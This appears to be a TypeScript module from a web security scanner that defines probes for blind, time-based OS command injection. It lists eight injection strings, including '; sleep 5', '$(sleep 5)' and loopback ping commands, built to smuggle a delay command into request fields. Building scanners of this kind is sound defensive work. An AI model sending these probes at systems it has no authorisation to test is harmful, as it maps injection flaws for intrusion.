import type { PayloadVariant } from '../types';

export const META = {
  id: 'command-injection-blind-time',
  family: 'command-injection-blind-time' as const,
  name: 'Command Injection (Blind, Time-Based)',
  description: 'Detects blind OS command injection via sleep/ping/timeout timing delays.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['query', 'body', 'json', 'header', 'path'],
};

const PROBES = [
  { value: '; sleep 5', intent: 'Semicolon separator sleep 5s for timing delta', signals: ['timing-delta'] },
  { value: '| sleep 5 &', intent: 'Pipe + background sleep for async timing delta', signals: ['timing-delta'] },
  { value: '$(sleep 5)', intent: '$() substitution sleep for timing delta', signals: ['timing-delta'] },
  { value: '`sleep 5`', intent: 'Backtick substitution sleep for timing delta', signals: ['timing-delta'] },
  { value: '& timeout 5 &', intent: 'Background timeout command for Windows/Unix timing', signals: ['timing-delta'] },
  { value: '1; ping -c 5 127.0.0.1', intent: 'Ping loopback 5 times for ~5s timing delta', signals: ['timing-delta'] },
  { value: '|| sleep 5', intent: 'OR operator sleep — triggers if prior command fails', signals: ['timing-delta'] },
  { value: '; ping -n 5 127.0.0.1', intent: 'Windows ping loopback 5 times for timing delta', signals: ['timing-delta'] },
];

export function variants(): PayloadVariant[] {
  return PROBES.map((p, i) => ({
    id: `cmd-blind-time-${i + 1}`,
    family: 'command-injection-blind-time' as const,
    value: p.value,
    encoding: 'raw' as const,
    intent: p.intent,
    requiresOast: false,
    requiresBrowser: false,
    destructiveRisk: 'none' as const,
    expectedSignals: p.signals,
  }));
}
